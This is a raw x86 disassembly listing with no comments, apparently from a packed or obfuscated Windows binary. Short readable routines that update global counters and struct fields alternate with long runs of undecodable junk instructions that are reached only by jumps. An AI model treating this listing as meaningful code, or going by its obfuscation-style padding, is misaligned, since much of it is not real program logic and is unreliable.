  40625f:	cmp    al,0xe1
  406261:	pop    eax
  406262:	test   BYTE PTR [ecx+edx*1+0x28],cl
  406266:	adc    BYTE PTR [esi-0x112818f2],dl
  40626c:	test   eax,0xfe76a0a2
  406271:	out    0x52,al
  406273:	test   al,0x4c
  406275:	xor    BYTE PTR gs:[edi-0x31],cl
  406279:	push   ebp
  40627a:	dec    eax
  40627b:	clc    
  40627c:	stos   BYTE PTR es:[edi],al
  40627d:	cmp    dh,BYTE PTR [eax-0x1c]
  406280:	xchg   edx,eax
  406281:	mov    al,ds:0x99f66411
  406286:	adc    ah,BYTE PTR [esi-0x25a25410]
  40628c:	add    cl,BYTE PTR [eax-0x74e7ba75]
  406292:	jne    0x4062a4
  406294:	sub    DWORD PTR ds:0x42fd89,0x42fe06
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e773,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fdf2,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fdf2,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fdf2,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e5bb
  4062e2:	cmp    DWORD PTR ds:0x42fdf2,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fdf2
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fdf2,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fdf2
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fdf2,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	mov    eax,ds:0x8cc96560
  406333:	cmp    al,0x70
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x4062f4
  40633b:	or     ch,BYTE PTR [eax]
  40633d:	ja     0x406374
  40633f:	cdq    
  406340:	popf   
  406341:	mov    al,0x7b
  406343:	scas   al,BYTE PTR es:[edi]
  406344:	mov    ecx,DWORD PTR [ebx+0x29a3a294]
  40634a:	imul   eax,DWORD PTR [edx-0x6f86d77b],0x8dbfe9cc
  406354:	mov    DWORD PTR [ecx+ecx*2+0x47c1ff6a],ecx
  40635b:	hlt    
  40635c:	(bad)  
  40635d:	jne    0x4063bb
  40635f:	enter  0xaff0,0x33
  406363:	popf   
  406364:	int    0x51
  406366:	std    
  406367:	retf   0x6729
  40636a:	sub    al,0x51
  40636c:	dec    ebx
  40636d:	inc    esp
  40636e:	and    eax,0xd12c6f11
  406373:	adc    ebx,eax
  406375:	add    al,0xf2
  406377:	and    BYTE PTR [edx-0x6b],al
  40637a:	inc    ebp
  40637b:	das    
  40637c:	jg     0x40638e
  40637e:	jno    0x40637c
  406380:	add    esi,DWORD PTR [ecx]
  406382:	lds    edi,FWORD PTR [esi+0x5cbc25ca]
  406388:	(bad)  
  406389:	cmp    dh,bl
  40638b:	rcr    DWORD PTR [ecx+0x6e843a35],cl
  406391:	pushf  
  406392:	jmp    0xc5e9522c
  406397:	sub    al,0x10
  406399:	xchg   edx,eax
  40639a:	dec    esi
  40639b:	jge    0x40636e
  40639d:	fnstenv [edx+ebp*4+0x1a]
  4063a1:	das    
  4063a2:	xor    al,BYTE PTR [edi]
  4063a4:	sahf   
  4063a5:	adc    DWORD PTR [edx+0x5e],ebp
  4063a8:	bound  ebp,QWORD PTR [eax+ebp*8+0x64]
  4063ac:	inc    eax
  4063ad:	push   ds
  4063ae:	daa    
  4063af:	repz popa 
  4063b1:	pushf  
  4063b2:	push   0xffffffda
  4063b4:	out    0xdc,eax
  4063b6:	push   0x21bf7063
  4063bb:	mov    ebx,0xe6126fe
  4063c0:	pop    ebx
  4063c1:	jne    0x406347
  4063c3:	shr    BYTE PTR [edi],0x6c
  4063c6:	mov    ah,bl
  4063c8:	sub    edi,eax
  4063ca:	push   ds
  4063cb:	rcl    DWORD PTR [esi+0x64],1
  4063ce:	adc    eax,0xf810845a
  4063d3:	sub    ebx,eax
  4063d5:	and    ch,BYTE PTR [esi+0x15c8cf07]
  4063db:	add    dl,cl
  4063dd:	mov    ebp,0xcf637d43
  4063e2:	xchg   BYTE PTR [edx],ch
  4063e4:	sub    ebp,DWORD PTR [edi-0x4c]
  4063e7:	add    DWORD PTR [edi+0x44fd2718],esp
  4063ed:	mov    edi,DWORD PTR [ecx-0x79fb93b8]
  4063f3:	jnp    0x406423
  4063f5:	push   edx
  4063f6:	fmul   st,st(3)
  4063f8:	adc    bl,dl
  4063fa:	push   0x5cd4d241
  4063ff:	jno    0x4063eb
  406401:	sub    al,0xed
  406403:	xchg   DWORD PTR [ebx+0x50],ebp
  406406:	pop    ds
  406407:	int3   
  406408:	mov    bl,0xcc
  40640a:	je     0x40640e
  40640c:	scas   al,BYTE PTR es:[edi]
  40640d:	cmp    eax,0xd3bb4ce4
  406412:	mov    eax,ds:0x273e8ecd
  406417:	or     BYTE PTR [edi+0x6b],dh
  40641a:	pop    edx
  40641b:	sub    eax,0xf3b39426
  406420:	test   al,0xda
  406422:	push   ecx
  406423:	test   dh,ah
  406425:	ja     0x4063c7
  406427:	mov    cl,BYTE PTR [ebx+edx*8+0x12f30442]
  40642e:	ret    
  40642f:	addr16 gs repnz aas 
  406433:	or     DWORD PTR [ebp+0x26],0x78
  406437:	nop
  406438:	pop    esi
  406439:	mov    dl,0xaf
  40643b:	int    0xf5
  40643d:	jmp    0x40649c
  40643f:	mov    al,ds:0xae1e8085
  406444:	adc    eax,0x1a17e5
  406449:	cs mov bh,0xb2
  40644c:	mov    dl,0x2b
  40644e:	jmp    0x40643e
  406450:	mov    ch,0x8a
  406452:	fsubr  QWORD PTR [edi-0x1b]
  406455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406456:	(bad)  
  406458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406459:	addr16 push esi
  40645b:	sbb    DWORD PTR cs:[eax-0x34],ebp
  40645f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406460:	adc    bl,BYTE PTR [esi-0xe]
  406463:	stos   BYTE PTR es:[edi],al
  406464:	xor    BYTE PTR [esi+0x4f88ca2c],al
  40646a:	push   esp
  40646b:	ret    0xecc6
  40646e:	mov    dl,0xfb
  406470:	popa   
  406471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406472:	jecxz  0x406477
  406474:	clc    
  406475:	pusha  
  406476:	and    al,0x33
  406478:	lods   al,BYTE PTR ds:[esi]
  406479:	mov    al,ds:0x8f0a3cfa
  40647e:	sbb    DWORD PTR [ebx+0x42439c3b],esi
  406484:	outs   dx,BYTE PTR ds:[esi]
  406485:	jmp    0x9d9a829
  40648a:	inc    edi
  40648b:	mov    ch,0x52
  40648d:	push   es
  40648e:	ds push ss
  406490:	(bad)
  406493:	test   DWORD PTR [edi-0x44],ecx
  406496:	je     0x406470
  406498:	(bad)  
  406499:	adc    eax,0xe5150aee
  40649e:	stos   BYTE PTR es:[edi],al
  40649f:	mov    WORD PTR [esi],?
  4064a1:	add    al,bl
  4064a3:	fmul   st(1),st
  4064a5:	(bad)  
  4064a6:	gs (bad) 
  4064a8:	adc    BYTE PTR [ebp+0x419568f6],bh
  4064ae:	rcl    cl,0xd0
  4064b1:	push   ecx
  4064b2:	and    DWORD PTR [ebx+esi*2+0x57],edx
  4064b6:	pop    ecx
  4064b7:	cmp    ebx,ebx
  4064b9:	adc    eax,0xa217112d
  4064be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064bf:	ficom  WORD PTR [esi]
  4064c1:	mov    edi,0x8bdfa89f
  4064c6:	push   esp
  4064c7:	sub    al,0x14
  4064c9:	into   
  4064ca:	fsub   DWORD PTR [edi+0x5b]
  4064cd:	xchg   ebx,eax
  4064ce:	into   
  4064cf:	mov    dl,0xba
  4064d1:	adc    al,cl
  4064d3:	loope  0x406509
  4064d5:	dec    esp
  4064d6:	gs xor bh,al
  4064d9:	lock and BYTE PTR [ecx+0x2c95a6f5],0xaa
  4064e1:	and    bl,BYTE PTR [esi]
  4064e3:	pop    esi
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fdf6,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fd79
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fdf2,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fdf2,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fd59,0x42e77b
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	xchg   DWORD PTR [esi+0x2b],esi
  406569:	pop    esp
  40656a:	xor    edi,DWORD PTR [edx]
  40656c:	jo     0x4065de
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406573:	cmp    ah,BYTE PTR [ebp+0x49]
  406576:	jb     0x4065be
  406578:	push   eax
  406579:	(bad)  
  40657b:	mov    edx,0xd10b9b25
  406580:	retf   0x1104
  406583:	stos   BYTE PTR es:[edi],al
  406584:	and    DWORD PTR [ebx-0x4f],ecx
  406587:	lahf   
  406588:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406589:	(bad)  
  40658a:	scas   eax,DWORD PTR es:[edi]
  40658b:	fwait
  40658c:	rcl    BYTE PTR [ecx-0x50],1
  40658f:	jl     0x406607
  406591:	or     bl,BYTE PTR [ebx+0x78]
  406594:	ret    
  406595:	xchg   esp,eax
  406596:	int    0x9
  406598:	loop   0x4065a7
  40659a:	pop    es
  40659b:	(bad)  [eax]
  40659d:	aam    0x1e
  40659f:	add    BYTE PTR [edx],ch
  4065a1:	(bad)  
  4065a2:	mov    cl,0x17
  4065a4:	ins    DWORD PTR es:[edi],dx
  4065a5:	fcomp  DWORD PTR [edx+0x6d627219]
  4065ab:	jbe    0x406533
  4065ad:	ss (bad) 
  4065af:	addr16 pop eax
  4065b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065b2:	pop    ss
  4065b3:	fidiv  WORD PTR [edx-0x550a217e]
  4065b9:	(bad)  
  4065ba:	push   esp
  4065bb:	int3   
  4065bc:	xchg   ebp,eax
  4065bd:	(bad)  
  4065be:	stc    
  4065bf:	dec    ecx
  4065c0:	mov    bl,0x6f
  4065c2:	sbb    bl,BYTE PTR [ebx+0x52]
  4065c5:	dec    eax
  4065c6:	ss enter 0x3e47,0xd6
  4065cb:	cmp    BYTE PTR [ecx-0x1f],dh
  4065ce:	mov    bl,BYTE PTR [ebx+ebp*4+0x1542e936]
  4065d5:	jne    0x406562
  4065d7:	inc    ebp
  4065d8:	loopne 0x406574
  4065da:	dec    eax
  4065db:	cmp    al,0xeb
  4065dd:	shl    BYTE PTR [ecx+ebp*8],cl
  4065e0:	int3   
  4065e1:	mov    edi,0xf1b230e8
  4065e6:	sbb    bl,BYTE PTR [eax+0x4c]
  4065e9:	iret   
  4065ea:	cmp    DWORD PTR [edi],ebp
  4065ec:	adc    cl,BYTE PTR [ebp-0x3f]
  4065ef:	leave  
  4065f0:	xchg   esi,eax
  4065f1:	add    eax,0x1257d427
  4065f6:	mov    eax,0x922e5579
  4065fb:	loopne 0x406601
  4065fd:	push   0x71
  4065ff:	hlt    
  406600:	adc    DWORD PTR [eax],esp
  406602:	int    0x76
  406604:	cmp    al,0xbe
  406606:	xchg   esi,eax
  406607:	pop    ecx
  406608:	out    0x19,eax
  40660a:	push   0xd335456f
  40660f:	adc    bh,cl
  406611:	push   edi
  406612:	iret   
  406613:	pop    ebp
  406614:	add    dl,BYTE PTR [edi-0x1]
  406617:	fcmove st,st(1)
  406619:	std    
  40661a:	add    ah,0x97
  40661d:	out    0x3,eax
  40661f:	push   cs
  406620:	out    0xc1,eax
  406622:	enter  0x9a0e,0x3e
  406626:	add    bh,BYTE PTR [ecx-0x51]
  406629:	je     0x4065b9
  40662b:	mov    edx,0xe2746734
  406630:	jno    0x406679
  406632:	push   cs
  406633:	jns    0x406691
  406635:	test   al,0x56
  406637:	addr16 dec bl
  40663a:	nop
  40663b:	rcl    DWORD PTR [ebp-0x5be58e0a],cl
  406641:	sahf   
  406642:	ins    BYTE PTR es:[edi],dx
  406643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406644:	pop    eax
  406645:	mov    DWORD PTR [eax],ecx
  406647:	mov    bh,0xfe
  406649:	pop    es
  40664a:	jmp    DWORD PTR [edx+0x43]
  40664d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40664e:	mov    cl,dl
  406650:	mov    ebx,0xe753eaf8
  406655:	test   al,0x0
  406657:	imul   DWORD PTR [eax]
  406659:	dec    ebp
  40665a:	in     eax,0x99
  40665c:	int    0x99
  40665e:	jmp    0x68ff:0x7da3bb48
  406665:	pop    edi
  406666:	mov    DWORD PTR [ebx],eax
  406668:	mov    WORD PTR [edx-0x31310952],ss
  40666e:	scas   al,BYTE PTR es:[edi]
  40666f:	shr    DWORD PTR [edx-0x31],0xeb
  406673:	cdq    
  406674:	(bad)  
  406675:	ds jno 0x4066ac
  406678:	test   eax,0x6c976d98
  40667d:	push   0x47
  40667f:	lahf   
  406680:	xor    ch,BYTE PTR [esi]
  406682:	fisubr WORD PTR [eax+0x5a]
  406685:	ins    DWORD PTR es:[edi],dx
  406686:	xchg   ebx,eax
  406687:	mov    gs:0x28a46b52,al
  40668d:	arpl   WORD PTR [edi],bp
  40668f:	mov    al,ds:0xf4d3fc96
  406694:	bound  ebx,QWORD PTR [ecx*8-0x68b381d8]
  40669b:	jbe    0x40670a
  40669d:	push   ebx
  40669e:	add    eax,0xd518b0c
  4066a3:	mov    al,BYTE PTR [ebx+0x36ae2b75]
  4066a9:	dec    eax
  4066aa:	pop    ebp
  4066ab:	bound  ebp,QWORD PTR [edx+0x1cd5c780]
  4066b1:	enter  0x9d17,0xbe
  4066b5:	lahf   
  4066b6:	inc    esp
  4066b7:	sbb    BYTE PTR [ebx],0x42
  4066ba:	js     0x406714
  4066bc:	push   ebp
  4066bd:	ret    0x4522
  4066c0:	adc    edi,DWORD PTR [esi]
  4066c2:	mov    al,0xe6
  4066c4:	xchg   esp,eax
  4066c5:	xchg   ebp,eax
  4066c6:	sbb    ah,ch
  4066c8:	push   esp
  4066c9:	arpl   WORD PTR [eax-0x3c],bp
  4066cc:	xchg   esi,eax
  4066cd:	mov    edi,DWORD PTR [ebx-0x63]
  4066d0:	adc    edx,edi
  4066d2:	or     ecx,DWORD PTR [eax-0x6a]
  4066d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066d6:	inc    edi
  4066d7:	sti    
  4066d8:	inc    eax
  4066d9:	lea    esi,[ecx+0x66]
  4066dc:	(bad)  
  4066dd:	push   edx
  4066de:	push   edi
  4066df:	mov    ebp,0xcdab657a
  4066e4:	xchg   BYTE PTR [esi],dl
  4066e6:	int3   
  4066e7:	icebp  
  4066e8:	dec    ebp
  4066e9:	pop    edx
  4066ea:	jnp    0x406723
  4066ec:	stos   BYTE PTR es:[edi],al
  4066ed:	push   es
  4066ee:	dec    ebp
  4066ef:	repz imul eax,DWORD PTR fs:[edi],0x217eda75
  4066f7:	ds mov fs,ebx
  4066fa:	loopne 0x4066af
  4066fc:	mov    al,0x42
  4066fe:	mov    esi,0xd2f74b13
  406703:	std    
  406704:	ss dec eax
  406706:	stos   BYTE PTR es:[edi],al
  406707:	out    0xed,eax
  406709:	inc    ebx
  40670a:	dec    esp
  40670b:	mov    esi,esi
  40670d:	aam    0x8
  40670f:	and    BYTE PTR [eax],bh
  406711:	sar    edi,0xbc
  406714:	das    
  406715:	in     eax,0x82
  406717:	xlat   BYTE PTR ds:[ebx]
  406718:	cmp    DWORD PTR [ecx],esp
  40671a:	pop    ds
  40671b:	sbb    bh,BYTE PTR [edx-0xa]
  40671e:	dec    eax
  40671f:	popf   
  406720:	mov    ch,0xdb
  406722:	lock scas eax,DWORD PTR es:[edi]
  406724:	sub    al,0xc
  406726:	sbb    cl,BYTE PTR [ecx-0x593f3f1]
  40672c:	or     al,0xa
  40672e:	sbb    al,0xc5
  406730:	dec    esp
  406731:	mov    eax,0x538f536f
  406736:	hlt    
  406737:	xchg   edi,eax
  406738:	cmp    eax,0x2668847a
  40673d:	repnz xchg ebx,eax
  40673f:	popf   
  406740:	xor    ch,al
  406742:	mov    dl,0xd
  406744:	imul   esp,esp,0xffffff98
  406747:	cdq    
  406748:	fisub  WORD PTR [eax+0x63]
  40674b:	nop
  40674c:	pop    esp
  40674d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40674e:	push   ebp
  40674f:	mov    dl,BYTE PTR [ecx-0x41]
  406752:	cmp    al,0xc7
  406754:	jns    0x40675d
  406756:	pop    ebp
  406757:	es lock mov ebx,0xfdc8fe7d
  40675e:	fadd   st,st(4)
  406760:	sbb    ecx,DWORD PTR [ecx+0x7330dfc6]
  406766:	sub    bl,bh
  406768:	mov    cl,0x0
  40676a:	push   edx
  40676b:	adc    BYTE PTR [edi+0x52],0x53
  40676f:	fild   QWORD PTR ss:[ebx-0x13ad6b2f]
  406776:	mov    ah,BYTE PTR [edx]
  406778:	push   ebx
  406779:	shl    BYTE PTR [ebx-0x92ed669],cl
  40677f:	mov    eax,0xb7e44f52
  406784:	test   esi,ecx
  406786:	mov    ebp,0xa46637e7
  40678b:	fistp  DWORD PTR [edx+ebp*1+0x16]
  40678f:	inc    edx
  406790:	scas   al,BYTE PTR es:[edi]
  406791:	jnp    0x4067b8
  406793:	mov    esp,0xa2305f92
  406798:	std    
  406799:	jp     0x4067cd
  40679b:	std    
  40679c:	mov    ss,WORD PTR [esi-0x12]
  40679f:	into   
  4067a0:	rcr    DWORD PTR [edx],cl
  4067a2:	adc    DWORD PTR [esi+0x28],esi
  4067a5:	jmp    0xf3fb:0x67b827ce
  4067ac:	fidivr WORD PTR [esi]
  4067ae:	fsub   QWORD PTR [edi+0x1a59d055]
  4067b4:	jb     0x406824
  4067b6:	in     al,dx
  4067b7:	mov    ebx,0xfdf66670
  4067bc:	and    BYTE PTR [eax-0x16248578],dh
  4067c2:	mov    dh,BYTE PTR [edi-0x22]
  4067c5:	mov    al,0x6f
  4067c7:	mov    bl,0xfa
  4067c9:	imul   ebx,DWORD PTR [ecx+0x38a1372e],0x1c
  4067d0:	or     BYTE PTR [ebp-0x6a829f4f],ch
  4067d6:	pop    esp
  4067d7:	stc    
  4067d8:	push   ebx
  4067d9:	dec    edx
  4067da:	sar    BYTE PTR [ebx-0x55ad4b8b],1
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fd55,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e1a0,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e77b,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fd65,0x42e793
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	xor    DWORD PTR [ebx+0x38a5cd86],ecx
  40684c:	jo     0x4068be
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	sub    DWORD PTR [esi+0x15],ecx
  406855:	mov    esi,0xd7f4bba5
  40685a:	pop    esp
  40685b:	retf   0x9ca1
  40685e:	in     al,dx
  40685f:	rcr    BYTE PTR [edx-0x614a50ac],0xd3
  406866:	sti    
  406867:	pop    ss
  406868:	(bad)  
  406869:	jle    0x406887
  40686b:	bound  ebx,QWORD PTR [esi+eiz*4]
  40686e:	mov    esi,0xc8b0acbc
  406873:	mov    al,ds:0x95f5f507
  406878:	lds    ebp,FWORD PTR [ebp+0x21]
  40687b:	les    esi,FWORD PTR [edi+ecx*2-0x66c8324e]
  406882:	dec    esp
  406883:	cmp    eax,0x62460a69
  406888:	nop
  406889:	ja     0x4068c0
  40688b:	pop    esp
  40688c:	int3   
  40688d:	in     eax,0xca
  40688f:	fsubr  QWORD PTR [esp+ebx*4]
  406892:	and    eax,ebp
  406894:	arpl   si,si
  406896:	bound  ecx,QWORD PTR [edx+ebp*8-0x65ff8c9f]
  40689d:	pop    ecx
  40689e:	imul   ebp,DWORD PTR [esi+0x5e],0xffffffd4
  4068a2:	(bad)  
  4068a3:	lea    esp,[esi+0x2ca2c29c]
  4068a9:	or     DWORD PTR [edi-0xb],0xd533176e
  4068b0:	out    dx,al
  4068b1:	cmp    eax,0xdf113f62
  4068b6:	shr    DWORD PTR [esi],cl
  4068b8:	lock das 
  4068ba:	popa   
  4068bb:	xor    eax,0xda4e35f4
  4068c0:	cmp    eax,0x2a28bbed
  4068c5:	pop    ds
  4068c6:	jbe    0x406880
  4068c8:	mov    WORD PTR [eax-0x76],cs
  4068cb:	lock jnp 0x406872
  4068ce:	cmp    al,0x6
  4068d0:	jg     0x406879
  4068d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068d3:	mov    al,0x24
  4068d5:	in     eax,dx
  4068d6:	push   ebx
  4068d7:	xchg   edi,eax
  4068d8:	je     0x4068ed
  4068da:	neg    BYTE PTR ds:0x8251a465
  4068e0:	mov    dh,0xba
  4068e2:	sub    edx,DWORD PTR [edi-0x9]
  4068e5:	xor    DWORD PTR [ecx+esi*8-0x12f8324f],edx
  4068ec:	jle    0x4068a2
  4068ee:	test   bh,ch
  4068f0:	mov    al,ds:0x86d81d7e
  4068f5:	dec    edx
  4068f6:	ins    DWORD PTR es:[edi],dx
  4068f7:	ret    
  4068f8:	and    edi,DWORD PTR [ecx+0x65]
  4068fb:	and    esi,DWORD PTR [esi]
  4068fd:	xchg   BYTE PTR [ebx],ah
  4068ff:	faddp  st(5),st
  406901:	add    al,0xe0
  406903:	cmc    
  406904:	jp     0x406937
  406906:	push   ebx
  406907:	ds cmc 
  406909:	imul   edx,DWORD PTR [ecx+0x17],0xbab619b9
  406910:	add    ebp,DWORD PTR [ebx]
  406912:	inc    ecx
  406913:	inc    eax
  406914:	stos   DWORD PTR es:[edi],eax
  406915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406916:	dec    edx
  406917:	ror    ebx,1
  406919:	stos   BYTE PTR es:[edi],al
  40691a:	mov    ds:0x830f22ae,al
  40691f:	(bad)  
  406920:	icebp  
  406921:	adc    DWORD PTR [edi-0x6d830aac],ecx
  406927:	loop   0x4068f4
  406929:	push   es
  40692a:	push   eax
  40692b:	iret   
  40692c:	jns    0x4068f4
  40692e:	aam    0x66
  406930:	je     0x40693f
  406932:	dec    edi
  406933:	sar    BYTE PTR [ebx-0x289a80d3],1
  406939:	shl    DWORD PTR [edi],1
  40693b:	cmp    eax,0x4065d489
  406940:	pop    ebp
  406941:	add    al,0x27
  406943:	cmp    DWORD PTR [ecx-0x4ef65578],ebx
  406949:	push   0x7e
  40694b:	pusha  
  40694c:	test   DWORD PTR [esi],esp
  40694e:	enter  0x5ad6,0x5f
  406952:	pusha  
  406953:	sbb    edi,DWORD PTR [ebp+0x2f]
  406956:	pop    eax
  406957:	add    DWORD PTR [ebx],0xffffffb8
  40695a:	mov    BYTE PTR fs:[ecx+0x42b21ac2],cl
  406961:	test   BYTE PTR [esi+0x7931d031],al
  406967:	fstp   QWORD PTR [ebp-0x67]
  40696a:	lahf   
  40696b:	inc    ebp
  40696c:	xchg   esp,eax
  40696d:	std    
  40696e:	xor    bl,al
  406970:	fisub  WORD PTR [ebx+ebx*8-0x14]
  406974:	dec    esp
  406975:	push   cs
  406976:	mov    edx,0x46072de1
  40697b:	ja     0x4069b9
  40697d:	pop    ds
  40697e:	pop    DWORD PTR [ecx+0x69]
  406981:	dec    esp
  406982:	mov    eax,ds:0x20876b94
  406987:	mov    esi,0x5dec794f
  40698c:	dec    ebp
  40698d:	mov    esi,0x7eea84f2
  406992:	lods   al,BYTE PTR ds:[esi]
  406993:	out    0x9f,eax
  406995:	inc    ebp
  406996:	mov    ah,BYTE PTR [eax]
  406998:	(bad)  
  406999:	jp     0x406a09
  40699b:	or     DWORD PTR [ebx],esp
  40699d:	clc    
  40699e:	(bad)  
  40699f:	hlt    
  4069a0:	retf   
  4069a1:	push   cs
  4069a2:	push   eax
  4069a3:	(bad)  
  4069a4:	pushf  
  4069a5:	lds    edi,FWORD PTR [edi]
  4069a7:	int    0x8a
  4069a9:	outs   dx,BYTE PTR ds:[esi]
  4069aa:	inc    edx
  4069ab:	mov    edx,0xf38d535b
  4069b0:	dec    edi
  4069b1:	sub    bl,BYTE PTR [ebx]
  4069b3:	xor    al,0xb
  4069b5:	jmp    0x4069f9
  4069b7:	sub    DWORD PTR ds:0xeef496c4,edx
  4069bd:	sub    al,0xdd
  4069bf:	dec    edx
  4069c0:	mov    ds:0xcb5eb309,al
  4069c5:	jg     0x406a1d
  4069c7:	mov    ds:0xf9ff239b,al
  4069cc:	arpl   WORD PTR ds:0x4c9aaf41,ax
  4069d2:	into   
  4069d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069d4:	aam    0x9c
  4069d6:	(bad)  
  4069d8:	inc    eax
  4069d9:	addr16 mov ds:0x3c77,eax
  4069dd:	sbb    eax,0x52816b69
  4069e2:	push   ecx
  4069e3:	ret    
  4069e4:	pop    ebp
  4069e5:	in     al,0xf9
  4069e7:	inc    edx
  4069e8:	adc    dl,BYTE PTR [ebp-0x5a]
  4069eb:	or     al,ah
  4069ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069ee:	sbb    al,0x18
  4069f0:	inc    esp
  4069f1:	sti    
  4069f2:	mov    dh,0xb4
  4069f4:	stos   DWORD PTR es:[edi],eax
  4069f5:	loop   0x406a4a
  4069f7:	cli    
  4069f8:	and    bl,al
  4069fa:	xor    ebp,eax
  4069fc:	mov    WORD PTR [esi+0xf],ss
  4069ff:	repnz (bad) 
  406a01:	sub    eax,ebp
  406a03:	add    cl,BYTE PTR [ebp+ebx*8+0x7dcd2747]
  406a0a:	xor    bh,BYTE PTR [eax+ecx*8+0x2c]
  406a0e:	(bad)  
  406a0f:	out    dx,al
  406a10:	fst    QWORD PTR [eax-0x1c]
  406a13:	inc    eax
  406a14:	and    BYTE PTR [esi-0x1a48cc73],bl
  406a1a:	dec    si
  406a1c:	xor    edx,DWORD PTR [edx+0x1f]
  406a1f:	mov    WORD PTR [ebx],?
  406a21:	adc    esp,DWORD PTR [ecx+0x0]
  406a24:	adc    al,0xca
  406a26:	xor    cl,BYTE PTR fs:[ecx+0x46]
  406a2a:	outs   dx,BYTE PTR ds:[esi]
  406a2b:	xchg   BYTE PTR [ecx+0x94170c8],ah
  406a31:	outs   dx,BYTE PTR ds:[esi]
  406a32:	dec    eax
  406a33:	push   ecx
  406a34:	rol    BYTE PTR [edi-0x57f8f0ae],0x1d
  406a3b:	xor    al,0xf8
  406a3d:	sbb    eax,0xd1690487
  406a42:	pop    edi
  406a43:	popa   
  406a44:	repnz test DWORD PTR es:[edi],esp
  406a48:	jle    0x406a0d
  406a4a:	ins    DWORD PTR es:[edi],dx
  406a4b:	sbb    edx,ecx
  406a4d:	xor    DWORD PTR [eax+0x690084ce],esi
  406a53:	out    0x98,eax
